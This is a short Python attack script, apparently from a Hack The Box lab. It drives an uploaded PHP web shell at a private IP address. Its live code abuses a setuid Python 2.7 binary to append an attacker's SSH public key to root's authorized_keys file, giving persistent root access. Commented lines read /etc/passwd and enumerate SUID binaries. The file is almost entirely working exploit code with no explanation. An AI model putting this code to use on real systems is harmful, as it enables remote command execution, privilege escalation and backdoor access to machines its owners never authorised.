# import requests
#
# url="http://10.65.167.59/uploads/webshell.phtml"
# cmd="cat /etc/passwd | grep test"
# response = requests.get(url, {'cmd':cmd})
# print(response.content)
#
# import requests; print(requests.get(url, {'cmd':cmd}))
#
# import urllib.parse
#
# from urllib import parse, request
# cmd="cat /etc/passwd | grep test"
# print(parse.quote(cmd))

# from urllib import parse, request;print(request. get('${target_url}',{'cmd':'${command}'}))


from urllib import (parse, request);
url="http://10.65.167.59/uploads/webshell.phtml"
ssh_key = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFXu+BrjH60ixLz4X2d1tEIeYBhRbywDeBeWS0AamZ5t debian@htb-dev'
cmd=f"python2.7 -c 'import os; os.setuid(0); os.system(\"echo {ssh_key} >> /root/.ssh/authorized_keys\")'"
response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
cmd=f"python2.7 -c 'import os; os.setuid(0); os.system(\"cat /root/.ssh/authorized_keys\")'"
response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
#cmd='find / -user root -perm -4000 -print 2>/dev/null | tr "\n" ";"'
# response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]
# response=request.urlopen(f"{url}?cmd={parse.quote(cmd)}").read().decode().split('<br/>')[3]

print(response)
